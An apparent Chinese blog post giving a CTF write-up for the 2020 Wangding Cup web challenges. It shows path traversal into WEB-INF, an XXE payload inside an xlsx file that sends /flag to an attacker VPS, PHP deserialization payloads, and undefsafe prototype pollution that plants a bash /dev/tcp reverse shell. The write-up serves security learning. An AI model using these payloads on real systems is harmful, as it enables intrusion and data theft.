@@ -1,0 +1,745 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>2020网鼎杯 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2020网鼎杯">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-05-10 22:24" pubdate>
+        2020年5月10日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      30
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2020网鼎杯</h1>
+            
+            <div class="markdown-body">
+              <blockquote>
+<p>啥时候像队里师傅那么厉害就好了，我爬</p>
+</blockquote>
+<h1 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h1><p>在下载的页面可以读取任意文件(当然/flag读不到)，先读下WEB-INF</p>
+<pre><code class="hljs gradle"><span class="hljs-regexp">/file_in_java/</span>DownloadServlet?filename=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>web.xml
+
+WEB-INF/web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则.
+WEB-INF/database.properties : 数据库配置文件
+WEB-INF<span class="hljs-regexp">/classes/</span> : 一般用来存放Java类文件(.<span class="hljs-keyword">class</span>)
+WEB-INF<span class="hljs-regexp">/lib/</span> : 用来存放打包好的库(.jar)
+WEB-INF<span class="hljs-regexp">/src/</span> : 用来放源代码(.asp和.php等)</code></pre>
+
+<p>可以按照xml中的内容找到WEB-INF/classes/下的classes文件</p>
+<p>如</p>
+<pre><code class="hljs gradle">cn.abc.servlet.UploadServlet
+cn.abc.servlet.ListFileServlet
+cn.abc.servlet.DownloadServlet
+
+?filename=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>classes<span class="hljs-regexp">/cn/</span>abc<span class="hljs-regexp">/servlet/U</span>ploadServlet.<span class="hljs-keyword">class</span>
+?filename=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>classes<span class="hljs-regexp">/cn/</span>abc<span class="hljs-regexp">/servlet/</span>ListFileServlet.<span class="hljs-keyword">class</span>
+?filename=<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/WEB-INF/</span>classes<span class="hljs-regexp">/cn/</span>abc<span class="hljs-regexp">/servlet/</span>DownloadServlet.<span class="hljs-keyword">class</span></code></pre>
+
+<p>用jd-gui反编译后，代码审计发现可以利用CVE-2019-12415  xxe读文件，但对文件名有限制</p>
+<p><img src="https://s1.ax1x.com/2020/05/10/Y8Iwn0.png" srcset="/img/loading.gif" alt="Y8Iwn0.png"></p>
+<p>解析为xml的话会要求文件名为”excel-“开头，那我们就构造<code>excel-2.xlsx</code>就可以加以利用</p>
+<p>cve-20190-12415的利用方法很多，这里我们用<a target="_blank" rel="noopener" href="https://github.com/joernchen/xxeserve">xxeserve</a>这个工具</p>
+<p>先将<code>excel-2.xlsx</code>改为<code>excel-2.zip</code>解压，将下面代码填入自己的vps后放到<code>[Content_Types].xml</code>文件中</p>
+<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span>
+<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root</span> [</span>
+<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">remote</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://vps:port/xml?f=/flag&quot;</span>&gt;</span></span>
+<span class="hljs-meta">%remote;</span>
+<span class="hljs-meta">%int;</span>
+<span class="hljs-meta">%trick;]&gt;</span></code></pre>
+
+<p><img src="https://s1.ax1x.com/2020/05/10/Y8olvR.png" srcset="/img/loading.gif" alt="Y8olvR.png"></p>
+<p>再压缩为zip，改名为<code>excel-2.xlsx</code></p>
+<p>Kali 下利用xxeserve（我的kali 7001端口用frp穿透到了vps7001端口）监听，然后上传<code>excel-2.xlsx</code>读文件</p>
+<p><img src="https://s1.ax1x.com/2020/05/11/Y8ogIS.png" srcset="/img/loading.gif" alt="Y8ogIS.png"></p>
+<p>flag到手 hahaha</p>
+<p>这里有个坑 kali下ruby没<code>sinatra</code>,需要<code>gem install sinatra</code></p>
+<h1 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h1><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);
+
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;
+
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;
+    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;
+        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;
+        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;
+        <span class="hljs-keyword">$this</span>-&gt;process();   
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;
+            <span class="hljs-keyword">$this</span>-&gt;write();       
+        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;
+            <span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;read();
+            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-variable">$res</span>);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;
+            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;
+                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);
+                <span class="hljs-keyword">die</span>();
+            &#125;
+            <span class="hljs-variable">$res</span> = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);
+            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);
+            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);
+        &#125;
+    &#125;
+
+    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;
+            <span class="hljs-variable">$res</span> = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);
+        &#125;
+        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;
+    &#125;
+
+    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;
+        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)
+            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;
+        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-keyword">$this</span>-&gt;process();
+    &#125;
+
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;
+    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)
+        <span class="hljs-keyword">if</span>(!(ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+&#125;
+
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;
+
+    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];
+    <span class="hljs-keyword">if</span>(is_valid(<span class="hljs-variable">$str</span>)) &#123;
+        <span class="hljs-variable">$obj</span> = unserialize(<span class="hljs-variable">$str</span>);
+    &#125;
+
+&#125;
+</code></pre>
+
+<p>本来很简单的反序列化读取，但是直接读flag.php的话死活读不出来困死了，最后从y1ng师傅博客得知读取/proc/self/cmdline得到了配置文件，得到了httpd.conf的绝对路径读到了<code>/web/html/</code>web目录，接下来直接读<code>/web/html/flag.php</code></p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;/web/html/flag.php&#x27;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&quot;a&quot;</span>;
+&#125;
+<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> FileHandler();
+<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$a</span>);</code></pre>
+
+<p>赛后交流还发现了好几种payload</p>
+<pre><code class="hljs php">O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;
+O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;/web/html/flag.php&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;&#125;</code></pre>
+
+<p>这里就很奇怪了，然后y1ng师傅抛出了解答，反序列化没有异常的话会穿越到根目录，像上面的payload都会在反序列化的时候异常</p>
+<p>可以参考y1ng师傅的博客 <a target="_blank" rel="noopener" href="https://www.gem-love.com/websecurity/2322.html">https://www.gem-love.com/websecurity/2322.html</a></p>
+<p>ps. 有个知识点，序列化中大写S,<code>\00</code>会被解析成<code>%00</code>一个字符，小写s,<code>\00</code>不会被解析还是3个字符</p>
+<h1 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h1><p>给了源码</p>
+<pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);
+<span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);
+<span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);
+<span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);
+
+
+<span class="hljs-keyword">var</span> app = express();
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Notes</span> </span>&#123;
+    <span class="hljs-function"><span class="hljs-title">constructor</span>(<span class="hljs-params"></span>)</span> &#123;
+        <span class="hljs-built_in">this</span>.owner = <span class="hljs-string">&quot;whoknows&quot;</span>;
+        <span class="hljs-built_in">this</span>.num = <span class="hljs-number">0</span>;
+        <span class="hljs-built_in">this</span>.note_list = &#123;&#125;;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-title">write_note</span>(<span class="hljs-params">author, raw_note</span>)</span> &#123;
+        <span class="hljs-built_in">this</span>.note_list[(<span class="hljs-built_in">this</span>.num++).toString()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-title">get_note</span>(<span class="hljs-params">id</span>)</span> &#123;
+        <span class="hljs-keyword">var</span> r = &#123;&#125;
+        undefsafe(r, id, undefsafe(<span class="hljs-built_in">this</span>.note_list, id));
+        <span class="hljs-keyword">return</span> r;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-title">edit_note</span>(<span class="hljs-params">id, author, raw</span>)</span> &#123;
+        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);
+        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-title">get_all_notes</span>(<span class="hljs-params"></span>)</span> &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.note_list;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-title">remove_note</span>(<span class="hljs-params">id</span>)</span> &#123;
+        <span class="hljs-keyword">delete</span> <span class="hljs-built_in">this</span>.note_list[id];
+    &#125;
+&#125;
+
+<span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> Notes();
+notes.write_note(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);
+
+
+app.set(<span class="hljs-string">&#x27;views&#x27;</span>, path.join(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));
+app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);
+
+app.use(express.json());
+app.use(express.urlencoded(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));
+app.use(express.static(path.join(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));
+
+
+app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;
+  res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);
+&#125;);
+
+app.route(<span class="hljs-string">&#x27;/add_note&#x27;</span>)
+    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);
+    &#125;)
+    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+        <span class="hljs-keyword">let</span> author = req.body.author;
+        <span class="hljs-keyword">let</span> raw = req.body.raw;
+        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;
+            notes.write_note(author, raw);
+            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);
+        &#125;
+    &#125;)
+
+app.route(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)
+    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);
+    &#125;)
+    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+        <span class="hljs-keyword">let</span> id = req.body.id;
+        <span class="hljs-keyword">let</span> author = req.body.author;
+        <span class="hljs-keyword">let</span> enote = req.body.raw;
+        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;
+            notes.edit_note(id, author, enote);
+            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);
+        &#125;
+    &#125;)
+
+app.route(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)
+    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);
+    &#125;)
+    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+        <span class="hljs-keyword">let</span> id = req.body.id;
+        <span class="hljs-keyword">if</span> (id) &#123;
+            notes.remove_note(id);
+            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);
+        &#125;
+    &#125;)
+
+app.route(<span class="hljs-string">&#x27;/notes&#x27;</span>)
+    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+        <span class="hljs-keyword">let</span> q = req.query.q;
+        <span class="hljs-keyword">let</span> a_note;
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;
+            a_note = notes.get_all_notes();
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            a_note = notes.get_note(q);
+        &#125;
+        res.render(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);
+    &#125;)
+
+app.route(<span class="hljs-string">&#x27;/status&#x27;</span>)
+    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;
+        <span class="hljs-keyword">let</span> commands = &#123;
+            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,
+            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span>
+        &#125;;
+        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;
+            exec(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;
+                <span class="hljs-keyword">if</span> (err) &#123;
+                    <span class="hljs-keyword">return</span>;
+                &#125;
+                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);
+            &#125;);
+        &#125;
+        res.send(<span class="hljs-string">&#x27;OK&#x27;</span>);
+        res.end();
+    &#125;)
+
+
+app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;
+  res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);
+&#125;);
+
+
+app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) </span>&#123;
+  <span class="hljs-built_in">console</span>.error(err.stack);
+  res.status(<span class="hljs-number">500</span>).send(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);
+&#125;);
+
+
+<span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;
+app.listen(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))
+</code></pre>
+
+<p>undefsafe的原型链污染</p>
+<pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">edit_note</span>(<span class="hljs-params">id, author, raw</span>)</span> &#123;
+    undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);
+    undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);
+&#125;</code></pre>
+
+<p><a target="_blank" rel="noopener" href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a></p>
+<p>edit_notet提交</p>
+<pre><code class="hljs json">&#123;
+        &#x27;id&#x27;: &#x27;__proto__&#x27;,
+        &#x27;author&#x27;: &#x27;bash -i &gt;&amp; /dev/tcp/ip/7001 0&gt;&amp;1&#x27;,
+        &#x27;raw&#x27;: &#x27;ls&#x27;
+    &#125;</code></pre>
+
+<p>再访问status导致rce，反弹shell直接cat /flag即可</p>
+<h1 id="trace"><a href="#trace" class="headerlink" title="trace"></a>trace</h1><p>这题也没做出来，被只能写20条数据困死了，后来队里师傅说一遍sleep一边让他插入失败就可以正常进行盲注，学到了学到了。</p>
+<p><img src="https://s1.ax1x.com/2020/05/11/YGioOP.png" srcset="/img/loading.gif" alt="YGioOP.png"></p>
